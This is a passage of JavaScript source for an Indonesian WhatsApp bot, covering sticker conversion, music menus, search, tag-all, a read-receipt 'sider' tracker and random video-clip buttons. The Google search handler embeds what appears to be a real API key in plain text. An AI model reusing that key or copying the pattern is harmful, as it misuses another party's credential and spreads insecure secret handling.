						setReply('eror kak')
					}
					break
					
					
					
				case 'restart':
if (!isOwner && !dev.key.fromMe) return setReply("Khusus Owner")
await setReply(`Succes restarting`)
exec(`node main`)
break
	
			
				

				

								
				
				

case 'musik':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
teks = '*List Musik:*\n\n'
for (let awokwkwk of musiknye)
teks = `*──❒ MENU MUSIK ❒──*\n\nDont Spam Lanjut Musik Kirim Perintah :\nKirim sound_1 - sound_30\nKirim sholawat_1 - sholawat_20`
			
				
    const rows2 = [{
        "title": 'Backsound No Copyright Dj You Are Only O',
        "rowId": '0'
    }, {
        "title": 'Backsound No Copyright Dj Vacation Slowed',
        "rowId": '0'
    },{
        "title": 'Backsound No Copyright Dj Physico - Free',
        "rowId": '0'
    }, {
        "title": 'Backsound No Copyright Dj JedagJedug Campuran',
        "rowId": '0'
    },{
        "title": 'Backsound No Copyright Dj Alan Walker Full Bass',
        "rowId": '0'
    },{
        "title": 'dj_50',
        "rowId": '0'
    },{
        "title": 'dj_49',
        "rowId": '0'
    },{
        "title": 'dj_48',
        "rowId": '0'
    },{
        "title": 'dj_47',
        "rowId": '0'
    },{
        "title": 'dj_46',
        "rowId": '0'
    },{
        "title": 'dj_45',
        "rowId": '0'
    },{
        "title": 'dj_44',
        "rowId": '0'
    },{
        "title": 'dj_43',
        "rowId": '0'
    },{
        "title": 'dj_42',
        "rowId": '0'
    },{
        "title": 'dj_41',
        "rowId": '0'
    },{
        "title": 'dj_40',
        "rowId": '0'
    },{
        "title": 'dj_39',
        "rowId": '0'
    },{
        "title": 'dj_38',
        "rowId": '0'
    },{
        "title": 'dj_37',
        "rowId": '0'
    },{
        "title": 'dj_36',
        "rowId": '0'
    },{
        "title": 'dj_35',
        "rowId": '0'
    },{
        "title": 'dj_34',
        "rowId": '0'
    },{
        "title": 'dj_35',
        "rowId": '0'
    },{
        "title": 'dj_34',
        "rowId": '0'
    },{
        "title": 'dj_33',
        "rowId": '0'
    },{
        "title": 'dj_32',
        "rowId": '0'
    },{
        "title": 'dj_31',
        "rowId": '0'
    },{
        "title": 'dj_30',
        "rowId": '0'
    },{
        "title": 'dj_29',
        "rowId": '0'
    },{
        "title": 'dj_28',
        "rowId": '0'
    },{
        "title": 'dj_27',
        "rowId": '0'
    },{
        "title": 'dj_26',
        "rowId": '0'
    },{
        "title": 'dj_25',
        "rowId": '0'
    },{
        "title": 'dj_24',
        "rowId": '0'
    },{
        "title": 'dj_23',
        "rowId": '0'
    },{
        "title": 'dj_22',
        "rowId": '0'
    },{
        "title": 'dj_21',
        "rowId": '0'
    },{
        "title": 'dj_20',
        "rowId": '0'
    },{
        "title": 'dj_19',
        "rowId": '0'
    },{
        "title": 'dj_18',
        "rowId": '0'
    },{
        "title": 'dj_17',
        "rowId": '0'
    },{
        "title": 'dj_16',
        "rowId": '0'
    },{
        "title": 'dj_15',
        "rowId": '0'
    },{
        "title": 'dj_14',
        "rowId": '0'
    },{
        "title": 'dj_13',
        "rowId": '0'
    },{
        "title": 'dj_12',
        "rowId": '0'    
    },{
        "title": 'dj_11',
        "rowId": '0'    
    },{
        "title": 'dj_10',
        "rowId": '0'      
    },{
        "title": 'dj_9',
        "rowId": '0'        
    },{
        "title": 'dj_8',
        "rowId": '0'          
    },{
        "title": 'dj_7',
        "rowId": '0'           
    },{
        "title": 'dj_6',
        "rowId": '0'             
    },{
        "title": 'dj_5',
        "rowId": '0'            
    },{
        "title": 'dj_4',
        "rowId": '0'           
    },{
        "title": 'dj_3',
        "rowId": '0'            
    },{
        "title": 'dj_2',
        "rowId": '0'             
    },{
        "title": 'dj_1',
        "rowId": '0'         
    }];
    const sections2 = [{
        title: 'Pilih salah satu',
        rows: rows2
    }];
    const listt2 = {
        buttonText: 'SELECT HERE',
        description: `🎵 From 𝐢𝐌𝐲𝐬𝐭𝐁𝐨𝐭 🎵`,
        footerText: `Silahkan pilih salah satu`,
        sections: sections2,
        listType: 1
    };
    xdev.sendMessage(from, teks.trim(), extendedText, { quoted: setQuoted, contextInfo: forward })
    xdev.sendMessage(from, listt2, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })  
break
				
				

    

case 'exif':
case 'setexif':
                    if (!isOwner && !dev.key.fromMe) return onlyOwner()
					const exifff = `${args.join(' ')}`
					const namaPack = exifff.split('|')[0]
					const authorPack = exifff.split('|')[1]
					exif.create(namaPack, authorPack)
					await setReply('Done gan')
				break


case 'sticker':
					case 'stiker':
					case 's':
					if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
						if (isMedia && !dev.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
							const media = await xdev.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										setReply(err)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return setReply(mess.error.api)
											xdev.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: dev})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && dev.message.videoMessage.fileLength < 10000000 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
							const media = await xdev.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							setReply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										setReply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return setReply(error)
											xdev.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: dev})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						}  else {
							setReply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break





            case 'addcmd': 
			case 'setcmd':{
                  if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
                  if (isQuotedSticker) {
                  if (!q) return setReply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                   if (checkSCommand(kodenya, _scommand) === true) return setReply(`Command tersebut sudah ada`)
                  addCmd(kodenya, q)
                  setReply("_Success_")
                  } else {
                  setReply('tag stickenya')
                  }
                  }
            break
            

   
            
            case 'delcmd':{
                  if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
                  if (!isQuotedSticker) return setReply(`Penggunaan : ${command} tagsticker`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                  if (checkSCommand(kodenya, _scommand) === false) return setReply(`Command tersebut tidak ada`)
                  _scommand.splice(getCommandPosition(kodenya), 1)
                  fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
                  setReply("_Success_")
                  }
            break
            case 'listcmd':
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of _scommand) {
cemde.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd* : ${i.chats}`
}
mentions(teksnyee, cemde, true)
break
    case 'toimg':
			if (!isQuotedSticker) return setReply('Reply stickernya')
			setReply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await xdev.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return setReply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			xdev.sendMessage(from, buffer, image)
			fs.unlinkSync(ran)
			})
			break
	
	
			
			
	
	
	case 'semoji':
			if (!q) return setReply('*Emojinya?*')
			if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
    
case 'google':
if (args.length == 0) return reply(`Nama Yg Mau Cari Mana Tod!!*`)
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/gsearch?apikey=d16af494a6d7bd0fc1cf55a1&query=${query}`)
get_result = get_result.result
ini_txt = 'Google Search : \n'
for (var x of get_result) {
ini_txt += `*Title :* ${x.title}\n`
ini_txt += `*Link :* ${x.link}\n`
ini_txt += `*Desc :* ${x.desc}\n`
}
reply(ini_txt)
break    
	
            
 case 'gimage':
case 'googleimage':
case 'image':
if (args.length < 1) return setReply('*Apa Yang Mau Dicari?*')
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
teks = args.join(' ')
res = await gis(teks, google)
function google(error, result){
if (error){ return setReply('_[ ! ] Coba Lagi_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: dev, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
break




            
            
            
           
 
 
		
		

                 
                 
                 
    

            
    case 'runtime':
    case 'test':
    
            run = process.uptime() 
            teks = runtime(run)            
          //  await xdev.sendMessage(from, `Bot aktif selama ${teks.split(":")[0]} Jam - ${teks.split(":")[1]} Menit - ${teks.split(":")[2]} Detik`, text, {quoted: setQuoted})
          teksnya =`Bot aktif selama ${teks}`
            setReply(teksnya)
            break  
      
      
	case 'speed':
	case 'ping':
			const timestamp = speed();
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `${teks}Speed: ${latensi.toFixed(4)} Second`
			xdev.sendMessage(from, pingnya, text, {quoted: setQuoted})
			})
			break  
			
			

    
    

            
					
										case 'sider':
										try{
										if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply targetnya!')
infom = await xdev.messageInfo(from, dev.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
shape = '⦁'
teks = `Telah Dibaca Oleh : Nimbrung sini 😡\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `┗${shape} Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
} catch (err){
						console.log(err)
						setReply("Uh emror, pastikan yang di reply pesan dari botnya ya kak")
					}
break





case 'infoall': case 'tagall':
if(isExtream) return
if(!q) return setReply('Infonya apa kak ?')
if(!isOwner && !isGroupAdmins) return sendSticker(hanyaadmin)
var nom = dev.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `❒ @${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`*Teks :* ${q}
`+teks+`\n*${week}, ${calender}*`, members_id, false)
break














 
 
 
 
 
 
 
 
 
case "owner":
sendKontak(from, nomerOwner, namalu, "Jomblo😎");
break;
 
 
case 'shorturl':
 case 'tinyurl':{
									if (args.length < 1) return setReply(`Masukkan link`)
									if (!isUrl) return setReply(`Masukkan link`)
									const fetchText = (url, optiono) => {
										return new Promise((resolve, reject) => {
											return fetch(url, optiono)
											.then(response => response.text())
											.then(text => resolve(text))
											.catch(err => {
												console.log(color(err,'red'))
												reject(err)
												})
											})
										}
										okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
										shorti = `*Result : ${okok}*`
										setReply(shorti)
										}
									break
 
 

 
                 
 
 
case 'sewabot':
case 'sewalonte':
case 'sewa':
  if(isExtream) return
                       console.log('SEWA BOTZ')                       
                       gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `☰ ᴏᴡɴᴇʀ`}, type: 1}]  
                       
 gbuttonan = {
                           contentText: sewabot.dada(prefix, settings, pushname, ucapanWaktu) ,
                           footerText:`© ${fake1}`,
                           buttons: gbutsan,
                           headerType: 1
                           }
                         await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {                         
                         quoted: setQuoted, contextInfo: forward})                                 
                         break 
 
 
 
 
case '7hari':
if (!isPremium && !isOwner) return
try{
await xdev.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL ) 
} catch(err){
	console.log(err)
	}
break

case '7hari1':
if (!isPremium && !isOwner) return
try{
await xdev.toggleDisappearingMessages(from, 0)
} catch(err){
	console.log(err)
	}
break
 
 
 
 
 
 
 

 
 
 
default:
                                                      
if (isCmd && !multi && !isSimi || !isSimi && isCmd && multi && !dev.key.fromMe) {
if(autovn){  
sendvn(gakada)
} else 
if(autosticker) {
const kta =['./respon/sticker01.webp','./respon/sticker03.webp',
                                           './respon/sticker06.webp','./respon/sticker07.webp','./respon/sticker09.webp',
                                           './respon/sticker10.webp',
                                           './respon/sticker11.webp','./respon/sticker13.webp',
                                           './respon/sticker21.webp']                   
const su = kta[Math.floor(Math.random() * kta.length)]
halo = fs.readFileSync(`${su}`)
xdev.sendMessage(from, halo, sticker, {quoted: dev, contextInfo : forward})
} else if(typing){
setReply(textcmd )
}
}
					
					
//Simi simi            
if(isGroup && isCmd && isSimi && !dev.key.fromMe && !isSticker && !isAudio && !isMedia ){
simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
sami = simi.success
setReply(sami) 
}


}


//-------------------BATAS GARIS KATULISTIWA-----------------\\






//Waktu sewa group      
if(isGroup && dev.key.fromMe && budy.includes("Waktu sewa di grup ini sudah habis, bot akan keluar otomatis")){
await sendMess("Bye")
setTimeout( () => {
xdev.groupLeave(from)
},4000)
}


	if (responseButton == 'chika') {
    var ini_chika = ['https://e.top4top.io/m_20449tcq71.mp4', 'https://c.top4top.io/m_204409rac1.mp4', 'https://d.top4top.io/m_2044grrvq1.mp4', 'https://a.top4top.io/m_20447gp2m1.mp4', 'https://b.top4top.io/m_2044tms6o1.mp4', 'https://l.top4top.io/m_2044bpcnz1.mp4', 'https://k.top4top.io/m_2044djvwa1.mp4', 'https://i.top4top.io/m_2044edr6b1.mp4', 'https://j.top4top.io/m_20440trai1.mp4', 'https://h.top4top.io/m_20444e0od1.mp4', 'https://f.top4top.io/m_2044sd4yj1.mp4', 'https://g.top4top.io/m_2044pbyik1.mp4', 'https://e.top4top.io/m_2044plq2c1.mp4', 'https://c.top4top.io/m_20444gxgc1.mp4', 'https://d.top4top.io/m_2044huvjs1.mp4', 'https://k.top4top.io/m_2044jizu61.mp4', 'https://l.top4top.io/m_2044tz4ks1.mp4', 'https://a.top4top.io/m_2044jn6161.mp4', 'https://h.top4top.io/m_2044gcixv1.mp4', 'https://g.top4top.io/m_20444c9161.mp4', 'https://j.top4top.io/m_2044ptrlc1.mp4', 'https://i.top4top.io/m_2044pwj221.mp4', 'https://f.top4top.io/m_2044wk7cs1.mp4', 'https://e.top4top.io/m_2044z3oq91.mp4', 'https://d.top4top.io/m_2044pzqsv1.mp4'];
    var random_chika = ini_chika[Math.floor(Math.random() * (ini_chika.length))];
    let buff = await getBuffer(random_chika);
    xdev.sendMessage(from, buff, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'delvira') {
    setReply(mess.wait);
    var delvira = ['https://h.top4top.io/m_2045q48rg1.mp4', 'https://i.top4top.io/m_204581d7k1.mp4', 'https://j.top4top.io/m_2045uhkes1.mp4', 'https://g.top4top.io/m_2045l52is1.mp4', 'https://i.top4top.io/m_2045ai8cb1.mp4', 'https://d.top4top.io/m_2045u59ck1.mp4', 'https://f.top4top.io/m_204582jv91.mp4', 'https://e.top4top.io/m_2045l4uit1.mp4', 'https://g.top4top.io/m_20450f0kl1.mp4', 'https://a.top4top.io/m_2045pd6r01.mp4', 'https://c.top4top.io/m_2045g84yn1.mp4', 'https://h.top4top.io/m_2045t100r1.mp4', 'https://j.top4top.io/m_2045en2j01.mp4', 'https://b.top4top.io/m_2045upgh01.mp4', 'https://l.top4top.io/m_2045pu58m1.mp4', 'https://k.top4top.io/m_2045i29cg1.mp4', 'https://e.top4top.io/m_2045q6mkm1.mp4', 'https://f.top4top.io/m_2045jl1jg1.mp4', 'https://c.top4top.io/m_20450bu4q1.mp4', 'https://d.top4top.io/m_2045wojl61.mp4'];
    var random_delvira = delvira[Math.floor(Math.random() * (delvira.length))];
    let ini_delvira = await getBuffer(random_delvira);
    xdev.sendMessage(from, ini_delvira, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'ayu') {
    setReply(mess.wait);
    var ayu = ['https://h.top4top.io/m_2045353te1.mp4', 'https://i.top4top.io/m_2045uveyv1.mp4', 'https://g.top4top.io/m_2045mt9ww1.mp4', 'https://f.top4top.io/m_20450uurm1.mp4', 'https://c.top4top.io/m_2045qmp741.mp4', 'https://e.top4top.io/m_20452j1l01.mp4', 'https://b.top4top.io/m_2045k8f751.mp4', 'https://a.top4top.io/m_2045eg2jp1.mp4', 'https://d.top4top.io/m_2045jcjsl1.mp4', 'https://h.top4top.io/m_2045tjyl81.mp4', 'https://j.top4top.io/m_204595j5b1.mp4', 'https://d.top4top.io/m_2045crady1.mp4', 'https://g.top4top.io/m_20457ii1t1.mp4', 'https://k.top4top.io/m_2045zmfgu1.mp4', 'https://b.top4top.io/m_204514isy1.mp4', 'https://e.top4top.io/m_2045ryncv1.mp4', 'https://f.top4top.io/m_20456rgqd1.mp4', 'https://i.top4top.io/m_2045ie5dw1.mp4', 'https://l.top4top.io/m_2045o7w9v1.mp4', 'https://c.top4top.io/m_2045hcjnm1.mp4'];
    var random_ayu = ayu[Math.floor(Math.random() * (ayu.length))];
    let ini = await getBuffer(random_ayu);
    xdev.sendMessage(from, ini, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'bunga') {
    setReply(mess.wait);
    var bunga = ['https://d.top4top.io/m_2045ln0hy1.mp4', 'https://b.top4top.io/m_2045wt4lb1.mp4', 'https://a.top4top.io/m_2045s3khl1.mp4', 'https://f.top4top.io/m_2045jb2va1.mp4', 'https://l.top4top.io/m_2045c7vqm1.mp4', 'https://k.top4top.io/m_20459shmj1.mp4', 'https://b.top4top.io/m_2045v82yo1.mp4', 'https://h.top4top.io/m_20458jkj91.mp4', 'https://f.top4top.io/m_2045becu81.mp4', 'https://i.top4top.io/m_204546wbm1.mp4', 'https://e.top4top.io/m_20455p1.mp4', 'https://i.top4top.io/m_204573y8p1.mp4', 'https://h.top4top.io/m_204519hat1.mp4', 'https://k.top4top.io/m_204502t021.mp4', 'https://l.top4top.io/m_2045ex4p81.mp4', 'https://g.top4top.io/m_2045f693d1.mp4', 'https://j.top4top.io/m_2045ypbga1.mp4', 'https://d.top4top.io/m_2045kzqx61.mp4', 'https://j.top4top.io/m_2045ltjq51.mp4', 'https://c.top4top.io/m_20456e8wc1.mp4', 'https://c.top4top.io/m_2045oggyg1.mp4', 'https://g.top4top.io/m_204545km11.mp4', 'https://e.top4top.io/m_2045mbr0w1.mp4'];
    var random_bunga = bunga[Math.floor(Math.random() * (bunga.length))];
    let ini_bunga = await getBuffer(random_bunga);
    xdev.sendMessage(from, ini_bunga, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'aura') {
    setReply(mess.wait);
    var aura = ['https://g.top4top.io/m_2045kg02x1.mp4', 'https://f.top4top.io/m_2045bzzv61.mp4', 'https://e.top4top.io/m_2045u39bp1.mp4', 'https://c.top4top.io/m_2045nz5y81.mp4', 'https://b.top4top.io/m_2045bd5nx1.mp4', 'https://d.top4top.io/m_2045falge1.mp4', 'https://a.top4top.io/m_2045eljtw1.mp4', 'https://l.top4top.io/m_2045kcp201.mp4', 'https://j.top4top.io/m_2045at6161.mp4', 'https://i.top4top.io/m_2045nmmpu1.mp4', 'https://k.top4top.io/m_2045zox271.mp4', 'https://h.top4top.io/m_2045qzh0s1.mp4', 'https://g.top4top.io/m_2045bg23m1.mp4', 'https://e.top4top.io/m_20456vum81.mp4', 'https://c.top4top.io/m_2045vew941.mp4', 'https://d.top4top.io/m_20450ihor1.mp4', 'https://f.top4top.io/m_2045qyei51.mp4', 'https://b.top4top.io/m_2045pn2wh1.mp4', 'https://k.top4top.io/m_20457x5tn1.mp4', 'https://a.top4top.io/m_2045vc1vm1.mp4', 'https://l.top4top.io/m_2045bqxm91.mp4'];
    var random_aura = aura[Math.floor(Math.random() * (aura.length))];
    let ini_aura = await getBuffer(random_aura);
    xdev.sendMessage(from, ini_aura, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'nisa') {
    setReply(mess.wait);
    var nisa = ['https://i.top4top.io/m_2045a62xr1.mp4', 'https://f.top4top.io/m_2045ag1ah1.mp4', 'https://h.top4top.io/m_2045aao0z1.mp4', 'https://g.top4top.io/m_20452ycpb1.mp4', 'https://d.top4top.io/m_2045w6bhe1.mp4', 'https://e.top4top.io/m_2045xra1y1.mp4', 'https://l.top4top.io/m_2045t75ik1.mp4', 'https://c.top4top.io/m_2045tekbe1.mp4', 'https://b.top4top.io/m_20452iret1.mp4', 'https://a.top4top.io/m_2045mx50v1.mp4', 'https://j.top4top.io/m_2045p4i5g1.mp4', 'https://k.top4top.io/m_2045ka8zl1.mp4', 'https://i.top4top.io/m_2045ugp6n1.mp4', 'https://f.top4top.io/m_20452avj31.mp4', 'https://e.top4top.io/m_2045nb03l1.mp4', 'https://g.top4top.io/m_2045x4itm1.mp4', 'https://c.top4top.io/m_2045riu151.mp4', 'https://d.top4top.io/m_2045fz1ic1.mp4', 'https://l.top4top.io/m_2045i393z1.mp4', 'https://b.top4top.io/m_2045ws5mp1.mp4', 'https://k.top4top.io/m_20459e8w41.mp4', 'https://j.top4top.io/m_204558yj01.mp4', 'https://a.top4top.io/m_20457ksoh1.mp4', 'https://i.top4top.io/m_2045dk4sl1.mp4'];
    var random_nisa = nisa[Math.floor(Math.random() * (nisa.length))];
    let ini_nisa = await getBuffer(random_nisa);
    xdev.sendMessage(from, ini_nisa, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'ziva') {
    setReply(mess.wait);
    var ziva = ['https://a.top4top.io/m_2045w0s1a1.mp4', 'https://d.top4top.io/m_2045xs8yi1.mp4', 'https://b.top4top.io/m_2045azqmo1.mp4', 'https://f.top4top.io/m_2045two7u1.mp4', 'https://c.top4top.io/m_2045qyybj1.mp4', 'https://e.top4top.io/m_20451udwa1.mp4', 'https://g.top4top.io/m_2045wf56i1.mp4', 'https://j.top4top.io/m_2045eygb01.mp4', 'https://l.top4top.io/m_2045wc7px1.mp4', 'https://c.top4top.io/m_2045w1vo91.mp4', 'https://d.top4top.io/m_20456rh231.mp4', 'https://l.top4top.io/m_2045alof61.mp4', 'https://h.top4top.io/m_2045r85wl1.mp4', 'https://e.top4top.io/m_20451kltw1.mp4', 'https://g.top4top.io/m_20459k8ps1.mp4', 'https://f.top4top.io/m_2045ldcsq1.mp4', 'https://f.top4top.io/m_2045hvozl1.mp4', 'https://c.top4top.io/m_20452p34z1.mp4', 'https://l.top4top.io/m_2045msq4m1.mp4', 'https://i.top4top.io/m_20457dpjf1.mp4', 'https://k.top4top.io/m_2045252vc1.mp4', 'https://h.top4top.io/m_2045hmckz1.mp4', 'https://a.top4top.io/m_20457d0zk1.mp4', 'https://i.top4top.io/m_2045x1txz1.mp4', 'https://g.top4top.io/m_2045vh0di1.mp4', 'https://g.top4top.io/m_2045yl2it1.mp4', 'https://d.top4top.io/m_20456hnro1.mp4', 'https://k.top4top.io/m_20452q7ko1.mp4', 'https://k.top4top.io/m_20456hkh61.mp4', 'https://a.top4top.io/m_2045ytjc41.mp4', 'https://h.top4top.io/m_2045iwljm1.mp4', 'https://e.top4top.io/m_2045cuwm51.mp4', 'https://i.top4top.io/m_2045d43m11.mp4', 'https://b.top4top.io/m_2045qlcbo1.mp4', 'https://j.top4top.io/m_2045ym82h1.mp4', 'https://j.top4top.io/m_2045bew1l1.mp4', 'https://b.top4top.io/m_2045ythaz1.mp4'];
    var random_ziva = ziva[Math.floor(Math.random() * (ziva.length))];
    let ini_ziva = await getBuffer(random_ziva);
    xdev.sendMessage(from, ini_ziva, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'yana') {
    setReply(mess.wait);
    var yana = ['https://g.top4top.io/m_2045p55sm1.mp4', 'https://f.top4top.io/m_2045o2z231.mp4', 'https://h.top4top.io/m_2045na6v81.mp4', 'https://i.top4top.io/m_2045cdyjt1.mp4', 'https://c.top4top.io/m_2045ro9xo1.mp4', 'https://b.top4top.io/m_2045edz2q1.mp4', 'https://a.top4top.io/m_2045ybdlt1.mp4', 'https://i.top4top.io/m_2045kk4t61.mp4', 'https://d.top4top.io/m_2045ehl6b1.mp4', 'https://k.top4top.io/m_20454zh0e1.mp4', 'https://l.top4top.io/m_2045y6bfe1.mp4', 'https://j.top4top.io/m_2045wxx3t1.mp4', 'https://h.top4top.io/m_2045cyk6a1.mp4', 'https://g.top4top.io/m_2045buha21.mp4', 'https://c.top4top.io/m_2045jzgsn1.mp4', 'https://e.top4top.io/m_2045dd9x11.mp4', 'https://d.top4top.io/m_2045dg6hl1.mp4', 'https://b.top4top.io/m_2045zmtsq1.mp4', 'https://f.top4top.io/m_2045m94wa1.mp4', 'https://a.top4top.io/m_2045d8rwp1.mp4', 'https://l.top4top.io/m_2045l80391.mp4', 'https://k.top4top.io/m_20458j0dc1.mp4', 'https://j.top4top.io/m_2045hh4741.mp4', 'https://i.top4top.io/m_2045xk4x71.mp4'];
    var random_yana = yana[Math.floor(Math.random() * (yana.length))];
    let ini_yana = await getBuffer(random_yana);
    xdev.sendMessage(from, ini_yana, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'viona') {
    setReply(mess.wait);
